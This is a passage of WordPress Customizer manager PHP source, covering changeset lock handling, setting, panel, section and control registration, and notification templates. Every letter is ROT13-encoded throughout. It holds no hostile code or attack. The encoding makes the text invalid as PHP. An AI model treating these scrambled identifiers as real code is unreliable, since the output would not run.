				jc_fraq_wfba_reebe( 'ab_punatrfrg_gb_qvfzvff_ybpx', 404 );
			}
			vs ( ! pheerag_hfre_pna( trg_cbfg_glcr_bowrpg( 'phfgbzvmr_punatrfrg' )->pnc->rqvg_cbfg, $punatrfrg_cbfg_vq ) && ! $qvfzvff_nhgbfnir ) {
				jc_fraq_wfba_reebe( 'pnaabg_erzbir_punatrfrg_ybpx', 403 );
			}

			qryrgr_cbfg_zrgn( $punatrfrg_cbfg_vq, '_rqvg_ybpx' );

			vs ( ! $qvfzvff_nhgbfnir ) {
				jc_fraq_wfba_fhpprff( 'punatrfrg_ybpx_qvfzvffrq' );
			}
		}

		vs ( $qvfzvff_nhgbfnir ) {
			vs ( rzcgl( $punatrfrg_cbfg_vq ) || 'nhgb-qensg' === trg_cbfg_fgnghf( $punatrfrg_cbfg_vq ) ) {
				$qvfzvffrq = $guvf->qvfzvff_hfre_nhgb_qensg_punatrfrgf();
				vs ( $qvfzvffrq > 0 ) {
					jc_fraq_wfba_fhpprff( 'nhgb_qensg_qvfzvffrq' );
				} ryfr {
					jc_fraq_wfba_reebe( 'ab_nhgb_qensg_gb_qryrgr', 404 );
				}
			} ryfr {
				$erivfvba = jc_trg_cbfg_nhgbfnir( $punatrfrg_cbfg_vq, trg_pheerag_hfre_vq() );

				vs ( $erivfvba ) {
					vs ( ! pheerag_hfre_pna( trg_cbfg_glcr_bowrpg( 'phfgbzvmr_punatrfrg' )->pnc->qryrgr_cbfg, $punatrfrg_cbfg_vq ) ) {
						jc_fraq_wfba_reebe( 'pnaabg_qryrgr_nhgbfnir_erivfvba', 403 );
					}

					vs ( ! jc_qryrgr_cbfg( $erivfvba->VQ, gehr ) ) {
						jc_fraq_wfba_reebe( 'nhgbfnir_erivfvba_qryrgvba_snvyher', 500 );
					} ryfr {
						jc_fraq_wfba_fhpprff( 'nhgbfnir_erivfvba_qryrgrq' );
					}
				} ryfr {
					jc_fraq_wfba_reebe( 'ab_nhgbfnir_erivfvba_gb_qryrgr', 404 );
				}
			}
		}

		jc_fraq_wfba_reebe( 'haxabja_reebe', 500 );
	}

	/**
	 * Nqqf n phfgbzvmr frggvat.
	 *
	 * @fvapr 3.4.0
	 * @fvapr 4.5.0 Erghea nqqrq JC_Phfgbzvmr_Frggvat vafgnapr.
	 *
	 * @frr JC_Phfgbzvmr_Frggvat::__pbafgehpg()
	 * @yvax uggcf://qrirybcre.jbeqcerff.bet/gurzrf/phfgbzvmr-ncv
	 *
	 * @cnenz JC_Phfgbzvmr_Frggvat|fgevat $vq   Phfgbzvmr Frggvat bowrpg, be VQ.
	 * @cnenz neenl                       $netf Bcgvbany. Neenl bs cebcregvrf sbe gur arj Frggvat bowrpg.
	 *                                          Frr JC_Phfgbzvmr_Frggvat::__pbafgehpg() sbe vasbezngvba
	 *                                          ba npprcgrq nethzragf. Qrsnhyg rzcgl neenl.
	 * @erghea JC_Phfgbzvmr_Frggvat Gur vafgnapr bs gur frggvat gung jnf nqqrq.
	 */
	choyvp shapgvba nqq_frggvat( $vq, $netf = neenl() ) {
		vs ( $vq vafgnaprbs JC_Phfgbzvmr_Frggvat ) {
			$frggvat = $vq;
		} ryfr {
			$pynff = 'JC_Phfgbzvmr_Frggvat';

			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-phfgbzvmr-znantre.cuc */
			$netf = nccyl_svygref( 'phfgbzvmr_qlanzvp_frggvat_netf', $netf, $vq );

			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-phfgbzvmr-znantre.cuc */
			$pynff = nccyl_svygref( 'phfgbzvmr_qlanzvp_frggvat_pynff', $pynff, $vq, $netf );

			$frggvat = arj $pynff( $guvf, $vq, $netf );
		}

		$guvf->frggvatf[ $frggvat->vq ] = $frggvat;
		erghea $frggvat;
	}

	/**
	 * Ertvfgref nal qlanzvpnyyl-perngrq frggvatf, fhpu nf gubfr sebz $_CBFG['phfgbzvmrq']
	 * gung unir ab pbeerfcbaqvat frggvat perngrq.
	 *
	 * Guvf vf n zrpunavfz gb \"jnxr hc\" frggvatf gung unir orra qlanzvpnyyl perngrq
	 * ba gur sebag raq naq unir orra frag gb JbeqCerff va `$_CBFG['phfgbzvmrq']`. Jura JC
	 * ybnqf, gur qlanzvpnyyl-perngrq frggvatf gura jvyy trg perngrq naq cerivrjrq
	 * rira gubhtu gurl ner abg qverpgyl perngrq fgngvpnyyl jvgu pbqr.
	 *
	 * @fvapr 4.2.0
	 *
	 * @cnenz neenl $frggvat_vqf Gur frggvat VQf gb nqq.
	 * @erghea neenl Gur JC_Phfgbzvmr_Frggvat bowrpgf nqqrq.
	 */
	choyvp shapgvba nqq_qlanzvp_frggvatf( $frggvat_vqf ) {
		$arj_frggvatf = neenl();
		sbernpu ( $frggvat_vqf nf $frggvat_vq ) {
			// Fxvc frggvatf nyernql perngrq.
			vs ( $guvf->trg_frggvat( $frggvat_vq ) ) {
				pbagvahr;
			}

			$frggvat_netf  = snyfr;
			$frggvat_pynff = 'JC_Phfgbzvmr_Frggvat';

			/**
			 * Svygref n qlanzvp frggvat'f pbafgehpgbe netf.
			 *
			 * Sbe n qlanzvp frggvat gb or ertvfgrerq, guvf svygre zhfg or rzcyblrq
			 * gb bireevqr gur qrsnhyg snyfr inyhr jvgu na neenl bs netf gb cnff gb
			 * gur JC_Phfgbzvmr_Frggvat pbafgehpgbe.
			 *
			 * @fvapr 4.2.0
			 *
			 * @cnenz snyfr|neenl $frggvat_netf Gur nethzragf gb gur JC_Phfgbzvmr_Frggvat pbafgehpgbe.
			 * @cnenz fgevat      $frggvat_vq   VQ sbe qlanzvp frggvat, hfhnyyl pbzvat sebz `$_CBFG['phfgbzvmrq']`.
			 */
			$frggvat_netf = nccyl_svygref( 'phfgbzvmr_qlanzvp_frggvat_netf', $frggvat_netf, $frggvat_vq );
			vs ( snyfr === $frggvat_netf ) {
				pbagvahr;
			}

			/**
			 * Nyybj aba-fgngvpnyyl perngrq frggvatf gb or pbafgehpgrq jvgu phfgbz JC_Phfgbzvmr_Frggvat fhopynff.
			 *
			 * @fvapr 4.2.0
			 *
			 * @cnenz fgevat $frggvat_pynff JC_Phfgbzvmr_Frggvat be n fhopynff.
			 * @cnenz fgevat $frggvat_vq    VQ sbe qlanzvp frggvat, hfhnyyl pbzvat sebz `$_CBFG['phfgbzvmrq']`.
			 * @cnenz neenl  $frggvat_netf  JC_Phfgbzvmr_Frggvat be n fhopynff.
			 */
			$frggvat_pynff = nccyl_svygref( 'phfgbzvmr_qlanzvp_frggvat_pynff', $frggvat_pynff, $frggvat_vq, $frggvat_netf );

			$frggvat = arj $frggvat_pynff( $guvf, $frggvat_vq, $frggvat_netf );

			$guvf->nqq_frggvat( $frggvat );
			$arj_frggvatf[] = $frggvat;
		}
		erghea $arj_frggvatf;
	}

	/**
	 * Ergevrirf n phfgbzvmr frggvat.
	 *
	 * @fvapr 3.4.0
	 *
	 * @cnenz fgevat $vq Phfgbzvmr Frggvat VQ.
	 * @erghea JC_Phfgbzvmr_Frggvat|ibvq Gur frggvat, vs frg.
	 */
	choyvp shapgvba trg_frggvat( $vq ) {
		vs ( vffrg( $guvf->frggvatf[ $vq ] ) ) {
			erghea $guvf->frggvatf[ $vq ];
		}
	}

	/**
	 * Erzbirf n phfgbzvmr frggvat.
	 *
	 * Abgr gung erzbivat gur frggvat qbrfa'g qrfgebl gur JC_Phfgbzvmr_Frggvat vafgnapr be erzbir vgf svygref.
	 *
	 * @fvapr 3.4.0
	 *
	 * @cnenz fgevat $vq Phfgbzvmr Frggvat VQ.
	 */
	choyvp shapgvba erzbir_frggvat( $vq ) {
		hafrg( $guvf->frggvatf[ $vq ] );
	}

	/**
	 * Nqqf n phfgbzvmr cnary.
	 *
	 * @fvapr 4.0.0
	 * @fvapr 4.5.0 Erghea nqqrq JC_Phfgbzvmr_Cnary vafgnapr.
	 *
	 * @frr JC_Phfgbzvmr_Cnary::__pbafgehpg()
	 *
	 * @cnenz JC_Phfgbzvmr_Cnary|fgevat $vq   Phfgbzvmr Cnary bowrpg, be VQ.
	 * @cnenz neenl                     $netf Bcgvbany. Neenl bs cebcregvrf sbe gur arj Cnary bowrpg.
	 *                                        Frr JC_Phfgbzvmr_Cnary::__pbafgehpg() sbe vasbezngvba
	 *                                        ba npprcgrq nethzragf. Qrsnhyg rzcgl neenl.
	 * @erghea JC_Phfgbzvmr_Cnary Gur vafgnapr bs gur cnary gung jnf nqqrq.
	 */
	choyvp shapgvba nqq_cnary( $vq, $netf = neenl() ) {
		vs ( $vq vafgnaprbs JC_Phfgbzvmr_Cnary ) {
			$cnary = $vq;
		} ryfr {
			$cnary = arj JC_Phfgbzvmr_Cnary( $guvf, $vq, $netf );
		}

		$guvf->cnaryf[ $cnary->vq ] = $cnary;
		erghea $cnary;
	}

	/**
	 * Ergevrirf n phfgbzvmr cnary.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $vq Cnary VQ gb trg.
	 * @erghea JC_Phfgbzvmr_Cnary|ibvq Erdhrfgrq cnary vafgnapr, vs frg.
	 */
	choyvp shapgvba trg_cnary( $vq ) {
		vs ( vffrg( $guvf->cnaryf[ $vq ] ) ) {
			erghea $guvf->cnaryf[ $vq ];
		}
	}

	/**
	 * Erzbirf n phfgbzvmr cnary.
	 *
	 * Abgr gung erzbivat gur cnary qbrfa'g qrfgebl gur JC_Phfgbzvmr_Cnary vafgnapr be erzbir vgf svygref.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $vq Cnary VQ gb erzbir.
	 */
	choyvp shapgvba erzbir_cnary( $vq ) {
		// Erzbivat pber pbzcbaragf guvf jnl vf _qbvat_vg_jebat().
		vs ( va_neenl( $vq, $guvf->pbzcbaragf, gehr ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				fcevags(
					/* genafyngbef: 1: Cnary VQ, 2: Yvax gb 'phfgbzvmr_ybnqrq_pbzcbaragf' svygre ersrerapr. */
					__( 'Erzbivat %1$f znahnyyl jvyy pnhfr CUC jneavatf. Hfr gur %2$f svygre vafgrnq.' ),
					$vq,
					fcevags(
						'<n uers=\"%1$f\">%2$f</n>',
						rfp_hey( 'uggcf://qrirybcre.jbeqcerff.bet/ersrerapr/ubbxf/phfgbzvmr_ybnqrq_pbzcbaragf/' ),
						'<pbqr>phfgbzvmr_ybnqrq_pbzcbaragf</pbqr>'
					)
				),
				'4.5.0'
			);
		}
		hafrg( $guvf->cnaryf[ $vq ] );
	}

	/**
	 * Ertvfgref n phfgbzvmr cnary glcr.
	 *
	 * Ertvfgrerq glcrf ner ryvtvoyr gb or eraqrerq ivn WF naq perngrq qlanzvpnyyl.
	 *
	 * @fvapr 4.3.0
	 *
	 * @frr JC_Phfgbzvmr_Cnary
	 *
	 * @cnenz fgevat $cnary Anzr bs n phfgbz cnary juvpu vf n fhopynff bs JC_Phfgbzvmr_Cnary.
	 */
	choyvp shapgvba ertvfgre_cnary_glcr( $cnary ) {
		$guvf->ertvfgrerq_cnary_glcrf[] = $cnary;
	}

	/**
	 * Eraqref WF grzcyngrf sbe nyy ertvfgrerq cnary glcrf.
	 *
	 * @fvapr 4.3.0
	 */
	choyvp shapgvba eraqre_cnary_grzcyngrf() {
		sbernpu ( $guvf->ertvfgrerq_cnary_glcrf nf $cnary_glcr ) {
			$cnary = arj $cnary_glcr( $guvf, 'grzc', neenl() );
			$cnary->cevag_grzcyngr();
		}
	}

	/**
	 * Nqqf n phfgbzvmr frpgvba.
	 *
	 * @fvapr 3.4.0
	 * @fvapr 4.5.0 Erghea nqqrq JC_Phfgbzvmr_Frpgvba vafgnapr.
	 *
	 * @frr JC_Phfgbzvmr_Frpgvba::__pbafgehpg()
	 *
	 * @cnenz JC_Phfgbzvmr_Frpgvba|fgevat $vq   Phfgbzvmr Frpgvba bowrpg, be VQ.
	 * @cnenz neenl                       $netf Bcgvbany. Neenl bs cebcregvrf sbe gur arj Frpgvba bowrpg.
	 *                                          Frr JC_Phfgbzvmr_Frpgvba::__pbafgehpg() sbe vasbezngvba
	 *                                          ba npprcgrq nethzragf. Qrsnhyg rzcgl neenl.
	 * @erghea JC_Phfgbzvmr_Frpgvba Gur vafgnapr bs gur frpgvba gung jnf nqqrq.
	 */
	choyvp shapgvba nqq_frpgvba( $vq, $netf = neenl() ) {
		vs ( $vq vafgnaprbs JC_Phfgbzvmr_Frpgvba ) {
			$frpgvba = $vq;
		} ryfr {
			$frpgvba = arj JC_Phfgbzvmr_Frpgvba( $guvf, $vq, $netf );
		}

		$guvf->frpgvbaf[ $frpgvba->vq ] = $frpgvba;
		erghea $frpgvba;
	}

	/**
	 * Ergevrirf n phfgbzvmr frpgvba.
	 *
	 * @fvapr 3.4.0
	 *
	 * @cnenz fgevat $vq Frpgvba VQ.
	 * @erghea JC_Phfgbzvmr_Frpgvba|ibvq Gur frpgvba, vs frg.
	 */
	choyvp shapgvba trg_frpgvba( $vq ) {
		vs ( vffrg( $guvf->frpgvbaf[ $vq ] ) ) {
			erghea $guvf->frpgvbaf[ $vq ];
		}
	}

	/**
	 * Erzbirf n phfgbzvmr frpgvba.
	 *
	 * Abgr gung erzbivat gur frpgvba qbrfa'g qrfgebl gur JC_Phfgbzvmr_Frpgvba vafgnapr be erzbir vgf svygref.
	 *
	 * @fvapr 3.4.0
	 *
	 * @cnenz fgevat $vq Frpgvba VQ.
	 */
	choyvp shapgvba erzbir_frpgvba( $vq ) {
		hafrg( $guvf->frpgvbaf[ $vq ] );
	}

	/**
	 * Ertvfgref n phfgbzvmr frpgvba glcr.
	 *
	 * Ertvfgrerq glcrf ner ryvtvoyr gb or eraqrerq ivn WF naq perngrq qlanzvpnyyl.
	 *
	 * @fvapr 4.3.0
	 *
	 * @frr JC_Phfgbzvmr_Frpgvba
	 *
	 * @cnenz fgevat $frpgvba Anzr bs n phfgbz frpgvba juvpu vf n fhopynff bs JC_Phfgbzvmr_Frpgvba.
	 */
	choyvp shapgvba ertvfgre_frpgvba_glcr( $frpgvba ) {
		$guvf->ertvfgrerq_frpgvba_glcrf[] = $frpgvba;
	}

	/**
	 * Eraqref WF grzcyngrf sbe nyy ertvfgrerq frpgvba glcrf.
	 *
	 * @fvapr 4.3.0
	 */
	choyvp shapgvba eraqre_frpgvba_grzcyngrf() {
		sbernpu ( $guvf->ertvfgrerq_frpgvba_glcrf nf $frpgvba_glcr ) {
			$frpgvba = arj $frpgvba_glcr( $guvf, 'grzc', neenl() );
			$frpgvba->cevag_grzcyngr();
		}
	}

	/**
	 * Nqqf n phfgbzvmr pbageby.
	 *
	 * @fvapr 3.4.0
	 * @fvapr 4.5.0 Erghea nqqrq JC_Phfgbzvmr_Pbageby vafgnapr.
	 *
	 * @frr JC_Phfgbzvmr_Pbageby::__pbafgehpg()
	 *
	 * @cnenz JC_Phfgbzvmr_Pbageby|fgevat $vq   Phfgbzvmr Pbageby bowrpg, be VQ.
	 * @cnenz neenl                       $netf Bcgvbany. Neenl bs cebcregvrf sbe gur arj Pbageby bowrpg.
	 *                                          Frr JC_Phfgbzvmr_Pbageby::__pbafgehpg() sbe vasbezngvba
	 *                                          ba npprcgrq nethzragf. Qrsnhyg rzcgl neenl.
	 * @erghea JC_Phfgbzvmr_Pbageby Gur vafgnapr bs gur pbageby gung jnf nqqrq.
	 */
	choyvp shapgvba nqq_pbageby( $vq, $netf = neenl() ) {
		vs ( $vq vafgnaprbs JC_Phfgbzvmr_Pbageby ) {
			$pbageby = $vq;
		} ryfr {
			$pbageby = arj JC_Phfgbzvmr_Pbageby( $guvf, $vq, $netf );
		}

		$guvf->pbagebyf[ $pbageby->vq ] = $pbageby;
		erghea $pbageby;
	}

	/**
	 * Ergevrirf n phfgbzvmr pbageby.
	 *
	 * @fvapr 3.4.0
	 *
	 * @cnenz fgevat $vq VQ bs gur pbageby.
	 * @erghea JC_Phfgbzvmr_Pbageby|ibvq Gur pbageby bowrpg, vs frg.
	 */
	choyvp shapgvba trg_pbageby( $vq ) {
		vs ( vffrg( $guvf->pbagebyf[ $vq ] ) ) {
			erghea $guvf->pbagebyf[ $vq ];
		}
	}

	/**
	 * Erzbirf n phfgbzvmr pbageby.
	 *
	 * Abgr gung erzbivat gur pbageby qbrfa'g qrfgebl gur JC_Phfgbzvmr_Pbageby vafgnapr be erzbir vgf svygref.
	 *
	 * @fvapr 3.4.0
	 *
	 * @cnenz fgevat $vq VQ bs gur pbageby.
	 */
	choyvp shapgvba erzbir_pbageby( $vq ) {
		hafrg( $guvf->pbagebyf[ $vq ] );
	}

	/**
	 * Ertvfgref n phfgbzvmr pbageby glcr.
	 *
	 * Ertvfgrerq glcrf ner ryvtvoyr gb or eraqrerq ivn WF naq perngrq qlanzvpnyyl.
	 *
	 * @fvapr 4.1.0
	 *
	 * @cnenz fgevat $pbageby Anzr bs n phfgbz pbageby juvpu vf n fhopynff bs
	 *                        JC_Phfgbzvmr_Pbageby.
	 */
	choyvp shapgvba ertvfgre_pbageby_glcr( $pbageby ) {
		$guvf->ertvfgrerq_pbageby_glcrf[] = $pbageby;
	}

	/**
	 * Eraqref WF grzcyngrf sbe nyy ertvfgrerq pbageby glcrf.
	 *
	 * @fvapr 4.1.0
	 */
	choyvp shapgvba eraqre_pbageby_grzcyngrf() {
		vs ( $guvf->oenapuvat() ) {
			$y10a = neenl(
				/* genafyngbef: %f: Hfre jub vf phfgbzvmvat gur punatrfrg va phfgbzvmre. */
				'ybpxrq'                => __( '%f vf nyernql phfgbzvmvat guvf punatrfrg. Cyrnfr jnvg hagvy gurl ner qbar gb gel phfgbzvmvat. Lbhe yngrfg punatrf unir orra nhgbfnirq.' ),
				/* genafyngbef: %f: Hfre jub vf phfgbzvmvat gur punatrfrg va phfgbzvmre. */
				'ybpxrq_nyybj_bireevqr' => __( '%f vf nyernql phfgbzvmvat guvf punatrfrg. Qb lbh jnag gb gnxr bire?' ),
			);
		} ryfr {
			$y10a = neenl(
				/* genafyngbef: %f: Hfre jub vf phfgbzvmvat gur punatrfrg va phfgbzvmre. */
				'ybpxrq'                => __( '%f vf nyernql phfgbzvmvat guvf fvgr. Cyrnfr jnvg hagvy gurl ner qbar gb gel phfgbzvmvat. Lbhe yngrfg punatrf unir orra nhgbfnirq.' ),
				/* genafyngbef: %f: Hfre jub vf phfgbzvmvat gur punatrfrg va phfgbzvmre. */
				'ybpxrq_nyybj_bireevqr' => __( '%f vf nyernql phfgbzvmvat guvf fvgr. Qb lbh jnag gb gnxr bire?' ),
			);
		}

		sbernpu ( $guvf->ertvfgrerq_pbageby_glcrf nf $pbageby_glcr ) {
			$pbageby = arj $pbageby_glcr(
				$guvf,
				'grzc',
				neenl(
					'frggvatf' => neenl(),
				)
			);
			$pbageby->cevag_grzcyngr();
		}
		?>

		<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-phfgbzvmr-pbageby-qrsnhyg-pbagrag\">
			<#
			ine vachgVq = _.havdhrVq( 'phfgbzvmr-pbageby-qrsnhyg-vachg-' );
			ine qrfpevcgvbaVq = _.havdhrVq( 'phfgbzvmr-pbageby-qrsnhyg-qrfpevcgvba-' );
			ine qrfpevorqOlNgge = qngn.qrfpevcgvba ? ' nevn-qrfpevorqol=\"' + qrfpevcgvbaVq + '\" ' : '';
			#>
			<# fjvgpu ( qngn.glcr ) {
				pnfr 'purpxobk': #>
					<fcna pynff=\"phfgbzvmr-vafvqr-pbageby-ebj\">
						<vachg
							vq=\"{{ vachgVq }}\"
							{{{ qrfpevorqOlNgge }}}
							glcr=\"purpxobk\"
							inyhr=\"{{ qngn.inyhr }}\"
							qngn-phfgbzvmr-frggvat-xrl-yvax=\"qrsnhyg\"
						>
						<ynory sbe=\"{{ vachgVq }}\">
							{{ qngn.ynory }}
						</ynory>
						<# vs ( qngn.qrfpevcgvba ) { #>
							<fcna vq=\"{{ qrfpevcgvbaVq }}\" pynff=\"qrfpevcgvba phfgbzvmr-pbageby-qrfpevcgvba\">{{{ qngn.qrfpevcgvba }}}</fcna>
						<# } #>
					</fcna>
					<#
					oernx;
				pnfr 'enqvb':
					vs ( ! qngn.pubvprf ) {
						erghea;
					}
					#>
					<# vs ( qngn.ynory ) { #>
						<ynory sbe=\"{{ vachgVq }}\" pynff=\"phfgbzvmr-pbageby-gvgyr\">
							{{ qngn.ynory }}
						</ynory>
					<# } #>
					<# vs ( qngn.qrfpevcgvba ) { #>
						<fcna vq=\"{{ qrfpevcgvbaVq }}\" pynff=\"qrfpevcgvba phfgbzvmr-pbageby-qrfpevcgvba\">{{{ qngn.qrfpevcgvba }}}</fcna>
					<# } #>
					<# _.rnpu( qngn.pubvprf, shapgvba( iny, xrl ) { #>
						<fcna pynff=\"phfgbzvmr-vafvqr-pbageby-ebj\">
							<#
							ine inyhr, grkg;
							vs ( _.vfBowrpg( iny ) ) {
								inyhr = iny.inyhr;
								grkg = iny.grkg;
							} ryfr {
								inyhr = xrl;
								grkg = iny;
							}
							#>
							<vachg
								vq=\"{{ vachgVq + '-' + inyhr }}\"
								glcr=\"enqvb\"
								inyhr=\"{{ inyhr }}\"
								anzr=\"{{ vachgVq }}\"
								qngn-phfgbzvmr-frggvat-xrl-yvax=\"qrsnhyg\"
								{{{ qrfpevorqOlNgge }}}
							>
							<ynory sbe=\"{{ vachgVq + '-' + inyhr }}\">{{ grkg }}</ynory>
						</fcna>
					<# } ); #>
					<#
					oernx;
				qrsnhyg:
					#>
					<# vs ( qngn.ynory ) { #>
						<ynory sbe=\"{{ vachgVq }}\" pynff=\"phfgbzvmr-pbageby-gvgyr\">
							{{ qngn.ynory }}
						</ynory>
					<# } #>
					<# vs ( qngn.qrfpevcgvba ) { #>
						<fcna vq=\"{{ qrfpevcgvbaVq }}\" pynff=\"qrfpevcgvba phfgbzvmr-pbageby-qrfpevcgvba\">{{{ qngn.qrfpevcgvba }}}</fcna>
					<# } #>

					<#
					ine vachgNggef = {
						vq: vachgVq,
						'qngn-phfgbzvmr-frggvat-xrl-yvax': 'qrsnhyg'
					};
					vs ( 'grkgnern' === qngn.glcr ) {
						vachgNggef.ebjf = '5';
					} ryfr vs ( 'ohggba' === qngn.glcr ) {
						vachgNggef['pynff'] = 'ohggba ohggba-frpbaqnel';
						vachgNggef.glcr = 'ohggba';
					} ryfr {
						vachgNggef.glcr = qngn.glcr;
					}
					vs ( qngn.qrfpevcgvba ) {
						vachgNggef['nevn-qrfpevorqol'] = qrfpevcgvbaVq;
					}
					_.rkgraq( vachgNggef, qngn.vachg_nggef );
					#>

					<# vs ( 'ohggba' === qngn.glcr ) { #>
						<ohggba
							<# _.rnpu( _.rkgraq( vachgNggef ), shapgvba( inyhr, xrl ) { #>
								{{{ xrl }}}=\"{{ inyhr }}\"
							<# } ); #>
						>{{ vachgNggef.inyhr }}</ohggba>
					<# } ryfr vs ( 'grkgnern' === qngn.glcr ) { #>
						<grkgnern
							<# _.rnpu( _.rkgraq( vachgNggef ), shapgvba( inyhr, xrl ) { #>
								{{{ xrl }}}=\"{{ inyhr }}\"
							<# }); #>
						>{{ vachgNggef.inyhr }}</grkgnern>
					<# } ryfr vs ( 'fryrpg' === qngn.glcr ) { #>
						<# qryrgr vachgNggef.glcr; #>
						<fryrpg
							<# _.rnpu( _.rkgraq( vachgNggef ), shapgvba( inyhr, xrl ) { #>
								{{{ xrl }}}=\"{{ inyhr }}\"
							<# }); #>
							>
							<# _.rnpu( qngn.pubvprf, shapgvba( iny, xrl ) { #>
								<#
								ine inyhr, grkg;
								vs ( _.vfBowrpg( iny ) ) {
									inyhr = iny.inyhr;
									grkg = iny.grkg;
								} ryfr {
									inyhr = xrl;
									grkg = iny;
								}
								#>
								<bcgvba inyhr=\"{{ inyhr }}\">{{ grkg }}</bcgvba>
							<# } ); #>
						</fryrpg>
					<# } ryfr { #>
						<vachg
							<# _.rnpu( _.rkgraq( vachgNggef ), shapgvba( inyhr, xrl ) { #>
								{{{ xrl }}}=\"{{ inyhr }}\"
							<# }); #>
							>
					<# } #>
			<# } #>
		</fpevcg>

		<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-phfgbzvmr-abgvsvpngvba\">
			<yv pynff=\"abgvpr abgvpr-{{ qngn.glcr || 'vasb' }} {{ qngn.nyg ? 'abgvpr-nyg' : '' }} {{ qngn.qvfzvffvoyr ? 'vf-qvfzvffvoyr' : '' }} {{ qngn.pbagnvarePynffrf || '' }}\" qngn-pbqr=\"{{ qngn.pbqr }}\" qngn-glcr=\"{{ qngn.glcr }}\">
				<qvi pynff=\"abgvsvpngvba-zrffntr\">{{{ qngn.zrffntr || qngn.pbqr }}}</qvi>
				<# vs ( qngn.qvfzvffvoyr ) { #>
					<ohggba glcr=\"ohggba\" pynff=\"abgvpr-qvfzvff\"><fcna pynff=\"fperra-ernqre-grkg\">
						<?cuc
						/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
						_r( 'Qvfzvff' );
						?>
					</fcna></ohggba>
				<# } #>
			</yv>
		</fpevcg>

		<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-phfgbzvmr-punatrfrg-ybpxrq-abgvsvpngvba\">
			<yv pynff=\"abgvpr abgvpr-{{ qngn.glcr || 'vasb' }} {{ qngn.pbagnvarePynffrf || '' }}\" qngn-pbqr=\"{{ qngn.pbqr }}\" qngn-glcr=\"{{ qngn.glcr }}\">
				<qvi pynff=\"abgvsvpngvba-zrffntr phfgbzvmr-punatrfrg-ybpxrq-zrffntr {{ qngn.ybpxHfre.ningne ? 'unf-ningne' : '' }}\">
					<# vs ( qngn.ybpxHfre.ningne ) { #>
						<vzt pynff=\"phfgbzvmr-punatrfrg-ybpxrq-ningne\" fep=\"{{ qngn.ybpxHfre.ningne }}\" nyg=\"{{ qngn.ybpxHfre.anzr }}\" />
					<# } #>
					<c pynff=\"pheeragyl-rqvgvat\">
						<# vs ( qngn.zrffntr ) { #>
							{{{ qngn.zrffntr }}}
						<# } ryfr vs ( qngn.nyybjBireevqr ) { #>
							<?cuc
							rpub rfp_ugzy( fcevags( $y10a['ybpxrq_nyybj_bireevqr'], '{{ qngn.ybpxHfre.anzr }}' ) );
							?>
						<# } ryfr { #>
							<?cuc
							rpub rfp_ugzy( fcevags( $y10a['ybpxrq'], '{{ qngn.ybpxHfre.anzr }}' ) );
							?>
						<# } #>
					</c>
					<c pynff=\"abgvpr abgvpr-reebe abgvpr-nyg\" uvqqra></c>
					<c pynff=\"npgvba-ohggbaf\">
						<# vs ( qngn.ergheaHey !== qngn.cerivrjHey ) { #>
							<n pynff=\"ohggba phfgbzvmr-abgvpr-tb-onpx-ohggba\" uers=\"{{ qngn.ergheaHey }}\"><?cuc _r( 'Tb onpx' ); ?></n>
						<# } #>
						<n pynff=\"ohggba phfgbzvmr-abgvpr-cerivrj-ohggba\" uers=\"{{ qngn.sebagraqCerivrjHey }}\"><?cuc _r( 'Cerivrj' ); ?></n>
						<# vs ( qngn.nyybjBireevqr ) { #>
							<ohggba pynff=\"ohggba ohggba-cevznel jc-gno-ynfg phfgbzvmr-abgvpr-gnxr-bire-ohggba\"><?cuc _r( 'Gnxr bire' ); ?></ohggba>
						<# } #>
					</c>
				</qvi>
			</yv>
		</fpevcg>

		<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-phfgbzvmr-pbqr-rqvgbe-yvag-reebe-abgvsvpngvba\">
			<yv pynff=\"abgvpr abgvpr-{{ qngn.glcr || 'vasb' }} {{ qngn.nyg ? 'abgvpr-nyg' : '' }} {{ qngn.qvfzvffvoyr ? 'vf-qvfzvffvoyr' : '' }} {{ qngn.pbagnvarePynffrf || '' }}\" qngn-pbqr=\"{{ qngn.pbqr }}\" qngn-glcr=\"{{ qngn.glcr }}\">
				<qvi pynff=\"abgvsvpngvba-zrffntr\">{{{ qngn.zrffntr || qngn.pbqr }}}</qvi>

				<c>
					<# ine ryrzragVq = 'ry-' + Fgevat( Zngu.enaqbz() ); #>
					<vachg vq=\"{{ ryrzragVq }}\" glcr=\"purpxobk\">
					<ynory sbe=\"{{ ryrzragVq }}\"><?cuc _r( 'Hcqngr naljnl, rira gubhtu vg zvtug oernx lbhe fvgr?' ); ?></ynory>
				</c>
			</yv>
		</fpevcg>

		<?cuc
		/* Gur sbyybjvat grzcyngr vf bofbyrgr va pber ohg ergnvarq sbe cyhtvaf. */
		?>
		<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-phfgbzvmr-pbageby-abgvsvpngvbaf\">
			<hy>
				<# _.rnpu( qngn.abgvsvpngvbaf, shapgvba( abgvsvpngvba ) { #>
					<yv pynff=\"abgvpr abgvpr-{{ abgvsvpngvba.glcr || 'vasb' }} {{ qngn.nygAbgvpr ? 'abgvpr-nyg' : '' }}\" qngn-pbqr=\"{{ abgvsvpngvba.pbqr }}\" qngn-glcr=\"{{ abgvsvpngvba.glcr }}\">{{{ abgvsvpngvba.zrffntr || abgvsvpngvba.pbqr }}}</yv>
				<# } ); #>
			</hy>
		</fpevcg>

		<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-phfgbzvmr-cerivrj-yvax-pbageby\" >
			<# ine ryrzragCersvk = _.havdhrVq( 'ry' ) + '-' #>
			<c pynff=\"phfgbzvmr-pbageby-gvgyr\">
				<?cuc rfp_ugzy_r( 'Funer Cerivrj Yvax' ); ?>
			</c>
			<c pynff=\"qrfpevcgvba phfgbzvmr-pbageby-qrfpevcgvba\"><?cuc rfp_ugzy_r( 'Frr ubj punatrf jbhyq ybbx yvir ba lbhe jrofvgr, naq funer gur cerivrj jvgu crbcyr jub pna\'g npprff gur Phfgbzvmre.' ); ?></c>
			<qvi pynff=\"phfgbzvmr-pbageby-abgvsvpngvbaf-pbagnvare\"></qvi>
			<qvi pynff=\"cerivrj-yvax-jenccre\">
